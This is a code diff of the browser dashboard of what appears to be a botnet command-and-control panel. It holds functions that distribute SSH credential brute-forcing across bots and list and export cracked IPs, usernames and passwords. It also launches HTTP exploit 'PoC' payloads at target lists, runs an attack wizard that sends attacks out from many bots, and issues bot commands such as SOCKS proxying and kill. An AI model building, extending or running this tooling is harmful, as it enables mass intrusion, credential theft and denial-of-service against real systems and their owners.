+  acts += '<button class="drawer-act" onclick="popupStartSocks(\'' + id + '\')">SOCKS</button>';
   acts += '<button class="drawer-act" onclick="popupCmd(\'' + id + '\',\'!stopsocks\')">Stop SOCKS</button>';
-  acts += '<button class="drawer-act" onclick="popupCmd(\'' + id + '\',\'!reinstall\')">Reinstall</button>';
   acts += '<button class="drawer-act" onclick="popupCmd(\'' + id + '\',\'!updatefetch\')">Update Fetch</button>';
   acts += '<button class="drawer-act danger" onclick="popupKill(\'' + id + '\')">Kill</button>';
-
-  // Scanner toggles
-  _scannerDefs.forEach(function (sc, idx) {
-    var running = _scanState[id] && _scanState[id][sc.start];
-    var lbl = running ? '■ ' + sc.name : '▶ ' + sc.name;
-    var cls = running ? 'drawer-act' : 'drawer-act';
-    acts += '<button class="' + cls + '" style="' + (running ? 'color:#3fb950' : '') + '" onclick="toggleScanner(\'' + id + '\',' + idx + ');openDrawer(\'' + id + '\')">' + lbl + '</button>';
-  });
 
   document.getElementById('dr-actions').innerHTML = acts;
   rbacFilterActions();
   d.classList.add('open');
+  document.getElementById('bot-drawer-backdrop').classList.add('open');
 }
 
 function closeDrawer() {
   document.getElementById('bot-drawer').classList.remove('open');
+  document.getElementById('bot-drawer-backdrop').classList.remove('open');
   _drawerBotID = '';
 }
 
@@ -4190,8 +4958,8 @@ function renderWebhookTable(webhooks) {
       '<td>' + evtPills + '</td>' +
       '<td>' + enabledDot + '</td>' +
       '<td style="white-space:nowrap">' +
-        '<button class="socks-stop-btn" style="margin-right:4px" onclick="toggleWebhook(\'' + escHtml(wh.id) + '\',' + (!wh.enabled) + ')">' + (wh.enabled ? 'Disable' : 'Enable') + '</button>' +
-        '<button class="socks-stop-btn" onclick="deleteWebhook(\'' + escHtml(wh.id) + '\')">Delete</button>' +
+      '<button class="socks-stop-btn" style="margin-right:4px" onclick="toggleWebhook(\'' + escHtml(wh.id) + '\',' + (!wh.enabled) + ')">' + (wh.enabled ? 'Disable' : 'Enable') + '</button>' +
+      '<button class="socks-stop-btn" onclick="deleteWebhook(\'' + escHtml(wh.id) + '\')">Delete</button>' +
       '</td></tr>';
   });
   wrap.innerHTML = html + '</tbody></table>';
@@ -4279,7 +5047,7 @@ function loadCmdTemplates() {
       opt.textContent = t.name;
       sel.appendChild(opt);
     });
-  }).catch(function () {});
+  }).catch(function () { });
 }
 
 function applyCmdTemplate() {
@@ -4391,7 +5159,7 @@ function toggleCmdHistory() {
         var cmd = entry.cmdType || '';
         if (entry.args && entry.args.raw) cmd += ' ' + entry.args.raw;
         var ts = entry.timestamp || '';
-        if (ts) { try { ts = new Date(ts).toLocaleString(); } catch (e) {} }
+        if (ts) { try { ts = new Date(ts).toLocaleString(); } catch (e) { } }
         var target = entry.target || 'all';
         cmd = cmd.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
         target = target.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
@@ -4520,98 +5288,80 @@ function sshStart() {
     command = parts.join('; ');
   }
 
-  var targetList = targets.split('\n').map(function(l){ return l.trim(); }).filter(Boolean);
+  var targetList = targets.split('\n').map(function (l) { return l.trim(); }).filter(Boolean);
   var config = { mode: command ? 'payload' : 'report', combos: combos };
   if (command) config.command = command;
   if (document.getElementById('ssh-deploy-clean') && document.getElementById('ssh-deploy-clean').checked)
     config.clean = 'true';
+  if (document.getElementById('ssh-nohp') && document.getElementById('ssh-nohp').checked)
+    config.nohp = 'true';
 
-  fetch('/api/ssh/targets', {method:'POST', body: targets}).then(function() {
-    return fetch('/api/ssh/combos', {method:'POST', body: combos});
-  }).then(function() {
-    return fetch('/api/scan-job/create', {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({ type: 'ssh', targets: targetList, config: config, batchSize: 50 })
-    });
-  }).then(function(r){return r.json()}).then(function(d){
+  var f = getScanFilters();
+
+  fetch('/api/scan-job/create', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ type: 'ssh', targets: targetList, config: config, batchSize: 50, archFilter: f.archFilter, minRAM: f.minRAM })
+  }).then(function (r) { return r.json() }).then(function (d) {
     if (d.ok) {
       showToast('SSH scan job created: ' + d.total + ' targets distributed across bots', true);
       scanJobRefresh();
-    } else showToast('SSH scan failed: ' + (d.error||'unknown'), false);
+    } else showToast('SSH scan failed: ' + (d.error || 'unknown'), false);
     sshRefreshStatus();
-  }).catch(function(e){ showToast('SSH scan error: ' + e, false); });
+  }).catch(function (e) { showToast('SSH scan error: ' + e, false); });
 }
 
 function sshStop() {
-  fetch('/api/ssh/stop', {method:'POST'}).then(function(){
+  fetch('/api/scan-job/force-stop', { method: 'POST' }).then(function () {
     showToast('SSH scan stopped', true);
     sshRefreshStatus();
+    scanJobRefresh();
   });
 }
 
 function sshRefreshStatus() {
-  fetch('/api/ssh/status').then(function(r){return r.json()}).then(function(d){
+  fetch('/api/ssh/status').then(function (r) { return r.json() }).then(function (d) {
     var el = document.getElementById('ssh-status-text');
     if (!el) return;
     if (d.running) {
-      el.textContent = 'Running — ' + d.totalTargets + ' targets, ' + d.totalCombos + ' combos, ' + d.hits + ' hits';
+      el.textContent = 'Running — ' + (d.hits || 0) + ' hits';
       el.style.color = '#3fb950';
     } else {
       el.textContent = d.hits > 0 ? d.hits + ' hits found' : 'Idle';
       el.style.color = '';
     }
     sshUpdateBadge(d.hits || 0);
-  }).catch(function(){});
+  }).catch(function () { });
   sshRefreshHits();
 }
 
 function sshRefreshHits() {
-  fetch('/api/ssh/hits').then(function(r){return r.json()}).then(function(hits){
+  fetch('/api/ssh/hits').then(function (r) { return r.json() }).then(function (hits) {
     var wrap = document.getElementById('ssh-hits-wrap');
     if (!wrap) return;
     if (!hits || !hits.length) { wrap.innerHTML = ''; return; }
-    var html = '<table class="socks-dash-table"><thead><tr><th>IP</th><th>Country</th><th>User</th><th>Pass</th><th>Time</th></tr></thead><tbody>';
-    for (var i = hits.length - 1; i >= 0; i--) {
+    var html = '<table class="socks-dash-table"><thead><tr><th>IP</th><th>Country</th><th>User</th><th>Pass</th><th>Bot</th><th>Session</th><th>Time</th></tr></thead><tbody>';
+    for (var i = 0; i < hits.length; i++) {
       var h = hits[i];
-      html += '<tr><td style="font-family:monospace">' + escHtml(h.ip) + '</td><td>' + escHtml(h.country || '??') + '</td><td>' + escHtml(h.user) + '</td><td>' + escHtml(h.pass) + '</td><td>' + ago(h.timestamp) + '</td></tr>';
+      var ts = h.t || h.timestamp || '';
+      html += '<tr><td style="font-family:monospace">' + escHtml(h.ip) + '</td><td>' + escHtml(h.country || '??') + '</td><td>' + escHtml(h.user) + '</td><td>' + escHtml(h.pass) + '</td><td style="font-size:11px;color:var(--text-dim)">' + escHtml(h.botID || '') + '</td><td style="font-size:11px;color:var(--text-dim)">' + escHtml(h.sid || '') + '</td><td>' + ago(ts) + '</td></tr>';
     }
     html += '</tbody></table>';
     wrap.innerHTML = html;
-  }).catch(function(){});
+  }).catch(function () { });
 }
 
 function sshExportHits() {
-  fetch('/api/ssh/hits').then(function(r){return r.json()}).then(function(hits){
-    if (!hits || !hits.length) { showToast('No hits to export', false); return; }
-    var csv = 'IP,Country,User,Pass,Timestamp\n';
-    for (var i = 0; i < hits.length; i++) csv += hits[i].ip + ',' + (hits[i].country||'??') + ',' + hits[i].user + ',' + hits[i].pass + ',' + hits[i].timestamp + '\n';
-    var blob = new Blob([csv], {type:'text/csv'});
-    var a = document.createElement('a');
-    a.href = URL.createObjectURL(blob);
-    a.download = 'ssh_hits_' + new Date().toISOString().slice(0,10) + '.csv';
-    a.click();
-    showToast('Exported ' + hits.length + ' hits', true);
-  });
+  window.location = '/api/hits/export?mod=ssh&format=csv';
 }
 
 function sshExportTxt() {
-  fetch('/api/ssh/hits').then(function(r){return r.json()}).then(function(hits){
-    if (!hits || !hits.length) { showToast('No hits to export', false); return; }
-    var txt = '';
-    for (var i = 0; i < hits.length; i++) txt += hits[i].ip + ' ' + hits[i].user + ':' + hits[i].pass + '\n';
-    var blob = new Blob([txt], {type:'text/plain'});
-    var a = document.createElement('a');
-    a.href = URL.createObjectURL(blob);
-    a.download = 'ssh_hits_' + new Date().toISOString().slice(0,10) + '.txt';
-    a.click();
-    showToast('Exported ' + hits.length + ' hits', true);
-  });
+  window.location = '/api/hits/export?mod=ssh&format=txt';
 }
 
 function sshClearHits() {
   if (!confirm('Clear all SSH hits?')) return;
-  fetch('/api/ssh/hits', {method:'DELETE'}).then(function(){
+  fetch('/api/ssh/hits', { method: 'DELETE' }).then(function () {
     sshUpdateBadge(0);
     sshRefreshStatus();
     showToast('SSH hits cleared', true);
@@ -4636,14 +5386,14 @@ function sshBeep() {
     gain.gain.value = 0.06;
     gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.3);
     osc.start(); osc.stop(ctx.currentTime + 0.3);
-  } catch(e) {}
+  } catch (e) { }
 }
 
 function sshLoadFile(input, targetId) {
   var f = input.files && input.files[0];
   if (!f) return;
   var reader = new FileReader();
-  reader.onload = function(e) {
+  reader.onload = function (e) {
     document.getElementById(targetId).value = e.target.result;
     showToast('Loaded ' + f.name, true);
   };
@@ -4675,10 +5425,10 @@ function httpExplStart() {
   var body = document.getElementById('hexpl-body').value;
 
   if (!targetsRaw) { showToast('Enter target IPs', false); return; }
-  var targets = targetsRaw.split('\n').map(function(l) { return l.trim(); }).filter(Boolean);
+  var targets = targetsRaw.split('\n').map(function (l) { return l.trim(); }).filter(Boolean);
   var headers = {};
   if (headersRaw) {
-    headersRaw.split('\n').forEach(function(line) {
+    headersRaw.split('\n').forEach(function (line) {
       var idx = line.indexOf(':');
       if (idx > 0) headers[line.substring(0, idx).trim()] = line.substring(idx + 1).trim();
     });
@@ -4687,39 +5437,41 @@ function httpExplStart() {
   // Create scan job with work-stealing distribution
   var config = { method: method, path: path, port: String(port), ua: ua, expect: expect, body: body };
   var hi = 0;
-  Object.keys(headers).forEach(function(k) { config['header_' + (hi++)] = k + ': ' + headers[k]; });
+  Object.keys(headers).forEach(function (k) { config['header_' + (hi++)] = k + ': ' + headers[k]; });
+
+  var f = getScanFilters();
 
   fetch('/api/scan-job/create', {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ type: 'http', targets: targets, config: config, batchSize: 25 })
-  }).then(function(r) { return r.json(); }).then(function(d) {
+    body: JSON.stringify({ type: 'http', targets: targets, config: config, batchSize: 25, archFilter: f.archFilter, minRAM: f.minRAM })
+  }).then(function (r) { return r.json(); }).then(function (d) {
     if (d.ok) {
       showToast('Scan job created: ' + d.total + ' targets distributed across bots', true);
       document.getElementById('hexpl-status-text').textContent = 'Job running — targets distributed via work-stealing';
       scanJobRefresh();
     } else showToast(d.error || 'Failed', false);
-  }).catch(function() { showToast('Request failed', false); });
+  }).catch(function () { showToast('Request failed', false); });
 }
 
 function httpExplStop() {
-  fetch('/api/http-exploit/stop', { method: 'POST' }).then(function(r) { return r.json(); }).then(function(d) {
+  fetch('/api/http-exploit/stop', { method: 'POST' }).then(function (r) { return r.json(); }).then(function (d) {
     if (d.ok) { showToast('HTTP exploit stopped', true); document.getElementById('hexpl-status-text').textContent = 'Stopped'; }
   });
 }
 
 // HTTP Exploit PoC Config Save/Load/Delete
 function hexplRefreshPocs() {
-  fetch('/api/http-exploit/pocs').then(function(r){return r.json()}).then(function(pocs) {
+  fetch('/api/http-exploit/pocs').then(function (r) { return r.json() }).then(function (pocs) {
     var sel = document.getElementById('hexpl-poc-select');
     if (!sel) return;
     sel.innerHTML = '<option value="">-- PoC Configs --</option>';
-    (pocs || []).forEach(function(p) {
+    (pocs || []).forEach(function (p) {
       var opt = document.createElement('option');
       opt.value = p.id; opt.textContent = p.name;
       sel.appendChild(opt);
     });
-  }).catch(function(){});
+  }).catch(function () { });
 }
 
 function hexplSavePoc() {
@@ -4737,9 +5489,9 @@ function hexplSavePoc() {
   };
   fetch('/api/http-exploit/pocs', {
     method: 'POST',
-    headers: {'Content-Type':'application/json'},
+    headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(config)
-  }).then(function(r){return r.json()}).then(function(d) {
+  }).then(function (r) { return r.json() }).then(function (d) {
     if (d.ok) { showToast('PoC saved: ' + name, true); hexplRefreshPocs(); }
     else showToast(d.error || 'Save failed', false);
   });
@@ -4748,7 +5500,7 @@ function hexplSavePoc() {
 function hexplLoadPoc() {
   var sel = document.getElementById('hexpl-poc-select');
   if (!sel || !sel.value) { showToast('Select a PoC config first', false); return; }
-  fetch('/api/http-exploit/pocs/' + sel.value).then(function(r){return r.json()}).then(function(p) {
+  fetch('/api/http-exploit/pocs/' + sel.value).then(function (r) { return r.json() }).then(function (p) {
     if (!p || !p.id) { showToast('PoC not found', false); return; }
     if (p.method) document.getElementById('hexpl-method').value = p.method;
     if (p.path) document.getElementById('hexpl-path').value = p.path;
@@ -4766,7 +5518,7 @@ function hexplDeletePoc() {
   var sel = document.getElementById('hexpl-poc-select');
   if (!sel || !sel.value) { showToast('Select a PoC config first', false); return; }
   if (!confirm('Delete this PoC config?')) return;
-  fetch('/api/http-exploit/pocs/' + sel.value, { method: 'DELETE' }).then(function(r){return r.json()}).then(function(d) {
+  fetch('/api/http-exploit/pocs/' + sel.value, { method: 'DELETE' }).then(function (r) { return r.json() }).then(function (d) {
     if (d.ok) { showToast('PoC deleted', true); hexplRefreshPocs(); }
   });
 }
@@ -4775,28 +5527,29 @@ function hexplDeletePoc() {
 hexplRefreshPocs();
 
 function httpExplClearHits() {
-  fetch('/api/http-exploit/hits', { method: 'DELETE' }).then(function() {
+  fetch('/api/http-exploit/hits', { method: 'DELETE' }).then(function () {
     document.getElementById('hexpl-hits-wrap').innerHTML = '';
     showToast('Hits cleared', true);
   });
 }
 
 function httpExplRefreshHits() {
-  fetch('/api/http-exploit/hits').then(function(r) { return r.json(); }).then(function(hits) {
+  fetch('/api/http-exploit/hits').then(function (r) { return r.json(); }).then(function (hits) {
     var wrap = document.getElementById('hexpl-hits-wrap');
     if (!wrap || !hits || !hits.length) { if (wrap) wrap.innerHTML = '<div style="color:var(--text-dim);font-size:12px;padding:8px">No hits yet</div>'; return; }
-    var html = '<table class="socks-dash-table" style="font-size:12px"><thead><tr><th>IP</th><th>Status</th><th>Time</th></tr></thead><tbody>';
-    hits.forEach(function(h) {
+    var html = '<table class="socks-dash-table" style="font-size:12px"><thead><tr><th>IP</th><th>Country</th><th>Status</th><th>Bot</th><th>Time</th></tr></thead><tbody>';
+    hits.forEach(function (h) {
       var isHit = h.status && h.status.startsWith('2');
       var color = isHit ? 'var(--green)' : 'var(--text-dim)';
-      html += '<tr><td style="font-family:var(--mono)">' + escHtml(h.ip) + '</td><td style="color:' + color + '">' + escHtml(h.status) + '</td><td>' + ago(h.timestamp) + '</td></tr>';
+      var ts = h.t || h.timestamp || '';
+      html += '<tr><td style="font-family:var(--mono)">' + escHtml(h.ip) + '</td><td>' + escHtml(h.country || '??') + '</td><td style="color:' + color + '">' + escHtml(h.status) + '</td><td style="font-size:11px;color:var(--text-dim)">' + escHtml(h.botID || '') + '</td><td>' + ago(ts) + '</td></tr>';
     });
     wrap.innerHTML = html + '</tbody></table>';
   });
 }
 
 // Poll hits every 3s when on scanners or results tab
-setInterval(function() {
+setInterval(function () {
   if (document.querySelector('[data-tab="tab-scanners"].active')) {
     httpExplRefreshHits();
   }
@@ -4809,7 +5562,7 @@ setInterval(function() {
 }, 3000);
 
 // Live payload preview for HTTP exploit
-['hexpl-method','hexpl-path','hexpl-port','hexpl-ua','hexpl-expect','hexpl-headers','hexpl-body'].forEach(function(id) {
+['hexpl-method', 'hexpl-path', 'hexpl-port', 'hexpl-ua', 'hexpl-expect', 'hexpl-headers', 'hexpl-body'].forEach(function (id) {
   var el = document.getElementById(id);
   if (el) el.addEventListener('input', updateHexplPreview);
 });
@@ -4824,7 +5577,7 @@ function updateHexplPreview() {
   var body = (document.getElementById('hexpl-body') || {}).value || '';
   var preview = method + ' ' + path + ' HTTP/1.1\r\nHost: <TARGET>\r\nUser-Agent: ' + ua + '\r\n';
   if (headers.trim()) {
-    headers.trim().split('\n').forEach(function(h) { if (h.trim()) preview += h.trim() + '\r\n'; });
+    headers.trim().split('\n').forEach(function (h) { if (h.trim()) preview += h.trim() + '\r\n'; });
   }
   if (body && (method === 'POST' || method === 'PUT')) {
     preview += 'Content-Length: ' + body.length + '\r\n';
@@ -4838,7 +5591,7 @@ function updateHexplPreview() {
 // SCAN JOB PROGRESS
 // ===========================================================================
 function scanJobRefresh() {
-  fetch('/api/scan-job/progress').then(function(r) { return r.json(); }).then(function(d) {
+  fetch('/api/scan-job/progress').then(function (r) { return r.json(); }).then(function (d) {
     var panel = document.getElementById('scan-job-panel');
     if (!panel) return;
     if (!d.active) {
@@ -4887,7 +5640,7 @@ function scanJobRefresh() {
       if (d.hits > 0) { countEl.textContent = d.hits; countEl.style.display = ''; }
       else { countEl.textContent = '0'; countEl.style.display = 'none'; }
     }
-  }).catch(function() {});
+  }).catch(function () { });
 }
 
 // Parse credential result string: "user:pass" or "root:toor" or raw status
@@ -4907,24 +5660,24 @@ function parseCred(result) {
 }
 
 function copyText(text) {
-  navigator.clipboard.writeText(text).then(function() { showToast('Copied', true); });
+  navigator.clipboard.writeText(text).then(function () { showToast('Copied', true); });
 }
 
 function scanJobCopyAllHits() {
-  fetch('/api/scan-job/hits').then(function(r) { return r.json(); }).then(function(hits) {
+  fetch('/api/scan-job/hits').then(function (r) { return r.json(); }).then(function (hits) {
     if (!hits || !hits.length) { showToast('No hits', false); return; }
-    var lines = hits.map(function(h) {
+    var lines = hits.map(function (h) {
       var c = parseCred(h.result || h.status || '');
       return c.user ? h.ip + ' ' + c.user + ':' + c.pass : h.ip + ' ' + (h.result || h.status || '');
     });
-    navigator.clipboard.writeText(lines.join('\n')).then(function() { showToast('Copied ' + lines.length + ' hits', true); });
+    navigator.clipboard.writeText(lines.join('\n')).then(function () { showToast('Copied ' + lines.length + ' hits', true); });
   });
 }
 
 var _sjobHitsCache = [];
 
 function scanJobRefreshHits() {
-  fetch('/api/scan-job/hits').then(function(r) { return r.json(); }).then(function(hits) {
+  fetch('/api/scan-job/hits').then(function (r) { return r.json(); }).then(function (hits) {
     var table = document.getElementById('sjob-hits-table');
     var badge = document.getElementById('sjob-hits-badge');
     var countEl = document.getElementById('tab-results-count');
@@ -4939,19 +5692,19 @@ function scanJobRefreshHits() {
     if (badge) badge.textContent = hits.length;
     if (countEl) { countEl.textContent = hits.length; countEl.style.display = ''; }
     scanJobRenderHits(hits);
-  }).catch(function() {});
+  }).catch(function () { });
 }
 
 function scanJobFilterHits() {
   var q = (document.getElementById('sjob-hits-search') || {}).value || '';
   q = q.toLowerCase().trim();
   if (!q) { scanJobRenderHits(_sjobHitsCache); return; }
-  var filtered = _sjobHitsCache.filter(function(h) {
+  var filtered = _sjobHitsCache.filter(function (h) {
     var c = parseCred(h.result || h.status || '');
     return (h.ip && h.ip.toLowerCase().indexOf(q) >= 0) ||
-           (c.user && c.user.toLowerCase().indexOf(q) >= 0) ||
-           (c.pass && c.pass.toLowerCase().indexOf(q) >= 0) ||
-           (c.raw && c.raw.toLowerCase().indexOf(q) >= 0);
+      (c.user && c.user.toLowerCase().indexOf(q) >= 0) ||
+      (c.pass && c.pass.toLowerCase().indexOf(q) >= 0) ||
+      (c.raw && c.raw.toLowerCase().indexOf(q) >= 0);
   });
   scanJobRenderHits(filtered);
 }
@@ -4960,36 +5713,36 @@ function scanJobRenderHits(hits) {
   var table = document.getElementById('sjob-hits-table');
   if (!table || !hits) return;
   // Check if any hits have parseable credentials
-  var hasCreds = hits.some(function(h) { return parseCred(h.result || h.status || '').user; });
+  var hasCreds = hits.some(function (h) { return parseCred(h.result || h.status || '').user; });
   var html = '<table style="width:100%;border-collapse:collapse;font-size:12px"><thead><tr style="border-bottom:1px solid var(--border)">' +
     '<th style="text-align:left;padding:8px 12px;color:var(--text-dim)">IP</th>';
   if (hasCreds) {
     html += '<th style="text-align:left;padding:8px 12px;color:var(--text-dim)">User</th>' +
-            '<th style="text-align:left;padding:8px 12px;color:var(--text-dim)">Pass</th>';
+      '<th style="text-align:left;padding:8px 12px;color:var(--text-dim)">Pass</th>';
   } else {
     html += '<th style="text-align:left;padding:8px 12px;color:var(--text-dim)">Result</th>';
   }
   html += '<th style="text-align:left;padding:8px 12px;color:var(--text-dim)">Time</th>' +
     '<th style="width:30px"></th></tr></thead><tbody>';
-  hits.forEach(function(h) {
+  hits.forEach(function (h) {
     var c = parseCred(h.result || h.status || '');
     var copyStr = c.user ? h.ip + ':' + c.user + ':' + c.pass : h.ip + ' ' + c.raw;
     html += '<tr style="border-bottom:1px solid var(--border)">' +
       '<td style="padding:6px 12px;font-family:var(--mono);color:var(--green)">' + escHtml(h.ip) + '</td>';
     if (hasCreds) {
       html += '<td style="padding:6px 12px;font-family:var(--mono);color:var(--cyan)">' + escHtml(c.user) + '</td>' +
-              '<td style="padding:6px 12px;font-family:var(--mono);color:var(--text)">' + escHtml(c.pass) + '</td>';
+        '<td style="padding:6px 12px;font-family:var(--mono);color:var(--text)">' + escHtml(c.pass) + '</td>';
     } else {
       html += '<td style="padding:6px 12px;color:var(--text)">' + escHtml(c.raw) + '</td>';
     }
     html += '<td style="padding:6px 12px;color:var(--text-dim)">' + ago(h.updatedAt) + '</td>' +
-      '<td style="padding:4px"><button onclick="copyText(\'' + escHtml(copyStr).replace(/'/g,"\\'") + '\')" style="background:none;border:1px solid var(--border);border-radius:4px;color:var(--text-dim);cursor:pointer;font-size:10px;padding:2px 6px" title="Copy">cp</button></td></tr>';
+      '<td style="padding:4px"><button onclick="copyText(\'' + escHtml(copyStr).replace(/'/g, "\\'") + '\')" style="background:none;border:1px solid var(--border);border-radius:4px;color:var(--text-dim);cursor:pointer;font-size:10px;padding:2px 6px" title="Copy">cp</button></td></tr>';
   });
   table.innerHTML = html + '</tbody></table>';
 }
 
 function scanJobRefreshBotStats() {
-  fetch('/api/scan-job/bot-stats').then(function(r) { return r.json(); }).then(function(stats) {
+  fetch('/api/scan-job/bot-stats').then(function (r) { return r.json(); }).then(function (stats) {
     var wrap = document.getElementById('sjob-bot-stats');
     var body = document.getElementById('sjob-bot-stats-body');
     if (!wrap || !body) return;
@@ -5003,13 +5756,13 @@ function scanJobRefreshBotStats() {
       '<th style="text-align:right;padding:6px 12px;color:var(--red)">Err</th>' +
       '<th style="text-align:right;padding:6px 12px;color:var(--text-dim)">Rate</th>' +
       '</tr></thead><tbody>';
-    stats.sort(function(a, b) { return b.hits - a.hits; }); // top performers first
-    stats.forEach(function(s) {
+    stats.sort(function (a, b) { return b.hits - a.hits; }); // top performers first
+    stats.forEach(function (s) {
       var total = s.hits + s.misses + s.errors;
       var elapsed = s.startedAt ? Math.max(1, Math.floor((Date.now() - new Date(s.startedAt)) / 1000)) : 1;
       var rate = (total / elapsed).toFixed(1);
       html += '<tr style="border-bottom:1px solid var(--border)">' +
-        '<td style="padding:4px 12px;font-family:var(--mono);color:var(--blue)">' + escHtml(s.botID.substring(0,8)) + '</td>' +
+        '<td style="padding:4px 12px;font-family:var(--mono);color:var(--blue)">' + escHtml(s.botID.substring(0, 8)) + '</td>' +
         '<td style="padding:4px 12px;text-align:right">' + s.assigned + '</td>' +
         '<td style="padding:4px 12px;text-align:right;color:var(--green);font-weight:700">' + s.hits + '</td>' +
         '<td style="padding:4px 12px;text-align:right;color:var(--text-dim)">' + s.misses + '</td>' +
@@ -5017,31 +5770,31 @@ function scanJobRefreshBotStats() {
         '<td style="padding:4px 12px;text-align:right;color:var(--text-dim)">' + rate + '/s</td></tr>';
     });
     body.innerHTML = html + '</tbody></table>';
-  }).catch(function(){});
+  }).catch(function () { });
 }
 
 function scanJobStop() {
-  fetch('/api/scan-job/stop', { method: 'POST' }).then(function() {
+  fetch('/api/scan-job/stop', { method: 'POST' }).then(function () {
     showToast('Paused — bots finishing current batch, results still flowing', true); scanJobRefresh();
   });
 }
 
 function scanJobForceStop() {
   if (!confirm('Force stop kills all scanners immediately. In-flight results will be lost.')) return;
-  fetch('/api/scan-job/force-stop', { method: 'POST' }).then(function() {
+  fetch('/api/scan-job/force-stop', { method: 'POST' }).then(function () {
     showToast('Force stopped — all scanners killed', true); scanJobRefresh();
   });
 }
 
 function scanJobResume() {
-  fetch('/api/scan-job/resume', { method: 'POST' }).then(function() {
+  fetch('/api/scan-job/resume', { method: 'POST' }).then(function () {
     showToast('Scan job resumed', true); scanJobRefresh();
   });
 }
 
 function scanJobClear() {
   if (!confirm('Clear scan job and all results?')) return;
-  fetch('/api/scan-job/clear', { method: 'POST' }).then(function() {
+  fetch('/api/scan-job/clear', { method: 'POST' }).then(function () {
     document.getElementById('sjob-hits-feed').innerHTML = '<div style="color:var(--text-dim);font-size:11px;padding:8px;text-align:center">Waiting for results...</div>';
     showToast('Job cleared', true);
     scanJobRefresh();
@@ -5049,16 +5802,16 @@ function scanJobClear() {
 }
 
 function scanJobExportHits() {
-  fetch('/api/scan-job/hits').then(function(r) { return r.json(); }).then(function(hits) {
+  fetch('/api/scan-job/hits').then(function (r) { return r.json(); }).then(function (hits) {
     if (!hits || !hits.length) { showToast('No hits to export', false); return; }
     var csv = 'IP,Status,Result,Updated\n';
-    hits.forEach(function(h) {
+    hits.forEach(function (h) {
       csv += escHtml(h.ip) + ',' + escHtml(h.status) + ',' + escHtml(h.result || '') + ',' + (h.updatedAt || '') + '\n';
     });
     var blob = new Blob([csv], { type: 'text/csv' });
     var a = document.createElement('a');
     a.href = URL.createObjectURL(blob);
-    a.download = 'scan_hits_' + new Date().toISOString().slice(0,10) + '.csv';
+    a.download = 'scan_hits_' + new Date().toISOString().slice(0, 10) + '.csv';
     a.click();
   });
 }
@@ -5102,25 +5855,25 @@ function healthBadge(score) {
 var wizState = { step: 1, method: null, methods: [], target: '', port: '80', duration: 120, options: {}, filters: {} };
 
 function wizardInit() {
-  fetch('/api/attack-methods').then(function(r) { return r.json(); }).then(function(methods) {
+  fetch('/api/attack-methods').then(function (r) { return r.json(); }).then(function (methods) {
     wizState.methods = methods;
     renderMethodGrid(methods);
-  }).catch(function() {});
+  }).catch(function () { });
 }
 
 function renderMethodGrid(methods) {
   var grid = document.getElementById('wiz-method-grid');
   if (!grid) return;
   grid.innerHTML = '';
-  methods.forEach(function(m) {
+  methods.forEach(function (m) {
     var card = document.createElement('div');
     card.className = 'method-card' + (wizState.method && wizState.method.id === m.id ? ' selected' : '');
     card.innerHTML = '<div class="mc-name">' + escHtml(m.name) + '</div>' +
       '<div class="mc-cat">' + escHtml(m.category) + '</div>' +
       '<div class="mc-desc">' + escHtml(m.desc) + '</div>';
-    card.onclick = function() {
+    card.onclick = function () {
       wizState.method = m;
-      grid.querySelectorAll('.method-card').forEach(function(c) { c.classList.remove('selected'); });
+      grid.querySelectorAll('.method-card').forEach(function (c) { c.classList.remove('selected'); });
       card.classList.add('selected');
     };
     grid.appendChild(card);
@@ -5142,7 +5895,7 @@ function wizardNext() {
     // Collect options
     wizState.options = {};
     var container = document.getElementById('wiz-options-container');
-    container.querySelectorAll('input,select').forEach(function(el) {
+    container.querySelectorAll('input,select').forEach(function (el) {
       if (el.value && el.value !== el.getAttribute('data-default')) {
         wizState.options[el.getAttribute('data-key')] = el.value;
       }
@@ -5168,7 +5921,7 @@ function renderWizardStep() {
     var page = document.getElementById('wiz-step-' + i);
     if (page) page.classList.toggle('active', i === wizState.step);
   }
-  document.querySelectorAll('.wizard-step').forEach(function(el) {
+  document.querySelectorAll('.wizard-step').forEach(function (el) {
     var s = parseInt(el.getAttribute('data-step'));
     el.classList.toggle('active', s === wizState.step);
     el.classList.toggle('done', s < wizState.step);
@@ -5185,7 +5938,7 @@ function renderWizardOptions() {
   var container = document.getElementById('wiz-options-container');
   if (!container || !wizState.method) return;
   container.innerHTML = '<p style="color:var(--text-dim);font-size:13px;margin-bottom:12px">Options for ' + escHtml(wizState.method.name) + ':</p>';
-  (wizState.method.options || []).forEach(function(opt) {
+  (wizState.method.options || []).forEach(function (opt) {
     var row = document.createElement('div');
     row.className = 'wiz-form-row';
     row.innerHTML = '<label>' + escHtml(opt.label) + '</label>' +
@@ -5206,7 +5959,7 @@ function renderWizardReview() {
   var optKeys = Object.keys(wizState.options);
   if (optKeys.length > 0) {
     html += '<div class="wr-row"><span class="wr-label">Options</span><span class="wr-value">' +
-      optKeys.map(function(k) { return k + '=' + wizState.options[k]; }).join(', ') + '</span></div>';
+      optKeys.map(function (k) { return k + '=' + wizState.options[k]; }).join(', ') + '</span></div>';
   }
   html += '<div class="wr-row"><span class="wr-label">Est. Bots</span><span class="wr-value">~' + estBots + '</span></div>';
   review.innerHTML = html;
@@ -5225,7 +5978,7 @@ function wizardLaunch() {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(payload)
-  }).then(function(r) { return r.json(); }).then(function(d) {
+  }).then(function (r) { return r.json(); }).then(function (d) {
     if (d.success) {
       showToast('Attack launched on ' + d.botCount + ' bots', true);
       wizState.step = 1;
@@ -5235,7 +5988,7 @@ function wizardLaunch() {
     } else {
       showToast(d.error || 'Attack failed', false);
     }
-  }).catch(function() { showToast('Request failed', false); });
+  }).catch(function () { showToast('Request failed', false); });
 }
 
 // Init wizard on load
@@ -5253,7 +6006,7 @@ function setShellLayout(layout) {
   var grid = document.getElementById('shell-grid');
   if (!grid) return;
   grid.className = 'shell-grid ' + layout;
-  document.querySelectorAll('.layout-btn').forEach(function(btn) {
+  document.querySelectorAll('.layout-btn').forEach(function (btn) {
     btn.classList.toggle('active', btn.getAttribute('onclick').indexOf("'" + layout + "'") > -1);
   });
